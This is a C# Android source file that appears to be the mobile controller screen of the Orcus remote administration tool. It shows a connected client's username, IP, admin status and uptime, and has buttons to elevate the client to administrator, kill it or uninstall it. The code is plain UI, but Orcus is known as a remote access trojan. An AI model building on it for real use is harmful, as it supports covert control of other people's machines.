using Android.App;
using Android.OS;
using Android.Views;
using Android.Widget;
using System.Globalization;

namespace Orcus.Administration.App
{
	public class HomeFragment : Fragment
	{
		public override void OnCreate (Bundle savedInstanceState)
		{
			base.OnCreate (savedInstanceState);

			// Create your fragment here
		}

		public override View OnCreateView (LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState)
		{
			// Use this to return your custom view for this Fragment
			// return inflater.Inflate(Resource.Layout.YourFragment, container, false);

			var view = inflater.Inflate (Resource.Layout.HomeFragment, null);
			var information = ConnectionManager.Current.CurrentController.Client;
			var clientCommand = ConnectionManager.Current.CurrentController.Commander.GetCommand<ClientActionCommand> ();

			view.FindViewById<TextView> (Resource.Id.usernameTextView).Text = information.UserName;
			view.FindViewById<TextView> (Resource.Id.IpTextView).Text = information.IpAddress;
			view.FindViewById<TextView> (Resource.Id.administratorTextView).Text = information.IsAdministrator.ToString ();
			view.FindViewById<TextView> (Resource.Id.osTextView).Text = information.OsName;
			try {
				view.FindViewById<TextView> (Resource.Id.languageTextView).Text = new CultureInfo(information.Language).EnglishName;
			} catch (System.Exception) {
				view.FindViewById<TextView> (Resource.Id.languageTextView).Text = "N/A";
			}

			view.FindViewById<TextView> (Resource.Id.serviceTextView).Text = information.IsServiceRunning.ToString ();
			view.FindViewById<TextView> (Resource.Id.onlineSinceTextView).Text = information.OnlineSince.ToLocalTime().ToString ();
			view.FindViewById<Button> (Resource.Id.MakeAdminButton).Click += (sender, e) => {
				new AlertDialog.Builder(Activity)
					.SetPositiveButton("Yes", (s, args) =>
						{
							clientCommand.MakeAdmin();
						})
					.SetNegativeButton("Cancel", (s2, args) =>
						{
							// User pressed no 
						})
					.SetMessage("Are you sure that you want to restart the application with administrator privileges?")
					.SetTitle("Warning")
					.Show();
			};
			view.FindViewById<Button> (Resource.Id.KillButton).Click += (sender, e) => {
				new AlertDialog.Builder(Activity)
					.SetPositiveButton("Yes", (s, args) =>
						{
							clientCommand.Shutdown();
						})
					.SetNegativeButton("Cancel", (s2, args) =>
						{
							// User pressed no 
						})
					.SetMessage("Are you sure that you want to kill the application?")
					.SetTitle("Warning")
					.Show();
			};
			view.FindViewById<Button> (Resource.Id.UninstallButton).Click += (sender, e) => {
				new AlertDialog.Builder(Activity)
					.SetPositiveButton("Yes", (s, args) =>
						{
							clientCommand.Uninstall();
						})
					.SetNegativeButton("Cancel", (s2, args) =>
						{
							// User pressed no 
						})
					.SetMessage("Are you sure that you want to uninstall the application?")
					.SetTitle("Warning")
					.Show();
			};
			return view;
		}
	}
}